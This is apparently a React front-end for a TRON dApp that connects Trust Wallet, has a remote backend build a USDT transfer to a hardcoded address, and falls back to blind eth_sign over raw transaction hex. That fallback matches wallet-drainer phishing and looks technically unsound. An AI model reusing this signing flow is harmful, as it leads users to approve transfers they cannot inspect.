
// Updated Frontend (App.js)
import React, { useState } from 'react';
import { SignClient } from '@walletconnect/sign-client';
import { Web3Modal } from '@web3modal/standalone';

const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const modal = new Web3Modal({
  projectId: PROJECT_ID,
});

const App = () => {
  const [client, setClient] = useState(null);
  const [session, setSession] = useState(null);
  const [account, setAccount] = useState('');

  const connectWallet = async () => {
    const _client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "TRX DApp",
        description: "Sign USDT TX",
        url: "https://smartcont.netlify.app",
        icons: ["https://smartcont.netlify.app/icon.png"],
      },
    });

   // Connect function mein requiredNamespaces ko update karo
const { uri, approval } = await _client.connect({
  requiredNamespaces: {
    tron: {
      methods: ["tron_signTransaction", "eth_sign"], // eth_sign add karo
      chains: ["tron:0x2b6653dc"],
      events: [],
    },
  },
});

    if (uri) {
      modal.openModal({ uri });
    }

    const _session = await approval();
    const _account = _session.namespaces.tron.accounts[0].split(':')[2];

    setClient(_client);
    setSession(_session);
    setAccount(_account);
  };

const sendUSDT = async () => {
  try {
    // Step 1: Get raw transaction from backend
    const res = await fetch("https://smartcontbackend.onrender.com/create-tx", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: account,
        to: "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB",
        amount: 1 // 1 USDT
      })
    });
    
    const tx = await res.json();
    
    // Step 2: Prepare Trust Wallet compatible payload
    const txPayload = {
      transaction: {
        ...tx,
        // Trust Wallet ko yeh special fields chahiye
        fee_limit: 10_000_000,  // 10 TRX (1000x increase)
        token: "TRX"             // Explicit token specify karo
      }
    };

    // Step 3: Request signature - TRON aur ETH dono methods try karo
    let signed;
    try {
      // Pehle tron_signTransaction se try karo
      signed = await client.request({
        topic: session.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "tron_signTransaction",
          params: [txPayload] // Object wrap karo array mein
        },
      });
    } catch (tronError) {
      console.log("Tron method failed, trying ETH fallback");
      // Fallback to eth_sign agar tron method fail ho
      signed = await client.request({
        topic: session.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "eth_sign",
          params: [account, tx.raw_data_hex] // Raw hex use karo
        },
      });
      
      // Eth signature ko Tron compatible banaye
      if (signed.startsWith("0x")) {
        signed = signed.substring(2);
      }
    }

    // Step 4: Broadcast signed transaction
    const broadcastRes = await fetch("https://smartcontbackend.onrender.com/broadcast", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        signedTx: {
          ...tx,
          signature: [signed] // Signature array mein wrap karo
        }
      })
    });

    const result = await broadcastRes.json();
    console.log("Broadcast Result:", result);
  } catch (err) {
    console.error("Full error details:", err);
  }
}; 
  return (
    <div>
      <button onClick={connectWallet}>Connect Trust Wallet</button>
      <button onClick={sendUSDT}>Send USDT</button>
    </div>
  );
};

export default App;
